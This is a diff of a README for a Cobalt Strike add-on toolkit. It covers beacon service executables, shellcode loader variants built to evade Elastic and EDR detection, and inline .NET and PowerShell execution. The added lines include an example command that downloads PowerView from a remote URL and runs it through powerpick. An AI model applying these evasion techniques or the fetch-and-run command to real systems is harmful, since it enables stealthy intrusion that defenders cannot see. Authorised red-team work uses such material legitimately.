@@ -23,7 +23,7 @@ Various resources to enhance Cobalt Strike's functionality and its ability to ev
 2. Service ⇒ Windows service executable
 **Note:** beaconsvc.cpp gets caught by Elastic static detection when compiled, so you might have to modify it. You can also run the standard EXE as a service, and it'll throw an error but still spawn the beacon.
 #### Three loader variants:
-1. Download Stager ⇒ download shellcode from file hosted on Cobalt Strike team server
+1. Download Stager ⇒ download shellcode from file hosted on Cobalt Strike team server over HTTPS
 2. Read Stager ⇒ read shellcode from disk
 3. Stageless ⇒ include shellcode directly in PE as a resource (in .rsrc section) - requires encoding the shellcode so it's not caught by Elastic
 #### Building the loader
@@ -39,6 +39,8 @@ Various resources to enhance Cobalt Strike's functionality and its ability to ev
 3. Load script into Cobalt Strike
 4. Execute .NET assembly inline with `x execute-assembly <exe> <args>`
 5. Execute unmanaged powershell inline with `x powerpick <powershell>`
+   - I made this compatible with `powershell-import`, but I noticed that using this method of importing scripts generally gets detected EDR. If you'd like to remove this functionality altogether, comment/remove lines 257 and 258.
+   - As an alternative, use `--import <script>` (eg. `x --import http://example.com/PowerView.ps1 powerpick Get-Domain`). You can specify a local file on disk or remotely hosted file with http/https. This only supports *one* script. I'm too lazy to extend the functionality to support multiple scripts when one is usually all you need.
 
 **Note:** I commented out the portions of the script that parse double quotes (") in arguments differently because I found this to get in the way, especially when running PowerShell commands. If you don't like this, you are welcome to uncomment the code portions starting on line 87.
 
